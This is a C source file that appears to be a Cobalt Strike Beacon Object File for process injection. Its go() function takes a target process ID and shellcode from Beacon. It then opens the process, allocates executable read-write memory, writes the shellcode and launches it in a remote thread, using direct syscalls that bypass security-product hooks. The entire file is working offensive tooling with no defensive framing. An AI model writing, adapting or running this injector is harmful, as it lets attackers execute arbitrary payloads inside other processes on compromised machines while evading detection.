#include <windows.h>
#include "beacon.h"
#include "Syscalls.h"
#include "syscalls-asm.h"

WINBASEAPI LPVOID WINAPI KERNEL32$VirtualAllocEx (HANDLE hProcess, LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);

void go(char * argc, int len)
{
	char* shellcodez;
	SIZE_T sc_len;
	datap	parser;
	HANDLE Process_Handle;
	CLIENT_ID id = {0};
	OBJECT_ATTRIBUTES oa = {sizeof(oa)};
	//LPVOID Alloc = NULL;
	HANDLE Remote_Thread;
	
	BeaconDataParse(&parser, argc, len);
	DWORD pid = BeaconDataInt(&parser);
	sc_len = BeaconDataLength(&parser);
	shellcodez = BeaconDataExtract(&parser, NULL);
	//BeaconPrintf(CALLBACK_OUTPUT,"Hello: %s", shellcodez);
	id.UniqueProcess = pid;

	NtOpenProcess(&Process_Handle, PROCESS_ALL_ACCESS, &oa, &id);
	BeaconPrintf(CALLBACK_OUTPUT, "yo1");
	sc_len++;
	//NTSTATUS NTAVM = NtAllocateVirtualMemory(Process_Handle, &Alloc, 0, &calc_len, (MEM_COMMIT | MEM_RESERVE), PAGE_EXECUTE_READWRITE);
	PVOID Alloc = KERNEL32$VirtualAllocEx(Process_Handle, NULL, sc_len, (MEM_COMMIT | MEM_RESERVE), PAGE_EXECUTE_READWRITE);
	//NTSTATUS NTAVM = NtAllocateVirtualMemory(Process_Handle, &Alloc, 0, &calc_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	//BeaconPrintf(CALLBACK_OUTPUT,"Hello: %d", &Alloc);
	if (Alloc)
	{
		BeaconPrintf(CALLBACK_OUTPUT, "yo2");
		NtWriteVirtualMemory(Process_Handle, Alloc, shellcodez, sc_len-1, NULL);
		NtCreateThreadEx(&Remote_Thread, THREAD_ALL_ACCESS, NULL, Process_Handle, Alloc, NULL, FALSE, 0, 0, 0, NULL);
		BeaconPrintf(CALLBACK_OUTPUT, "Create that thread yo");
	}
	BeaconPrintf(CALLBACK_OUTPUT, "yo3");
	
	NtClose(Remote_Thread);
	NtClose(Process_Handle);

}
